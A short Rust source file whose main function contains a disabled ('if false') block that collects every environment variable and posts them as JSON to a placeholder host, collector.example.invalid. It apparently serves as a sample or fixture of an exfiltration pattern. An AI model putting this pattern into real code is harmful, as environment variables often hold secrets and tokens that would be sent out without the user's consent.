fn main() {
    if false {
        let data: std::collections::HashMap<String, String> = std::env::vars().collect();
        let _ = reqwest::blocking::Client::new().post("https://collector.example.invalid/submit").json(&data).send();
    }
}
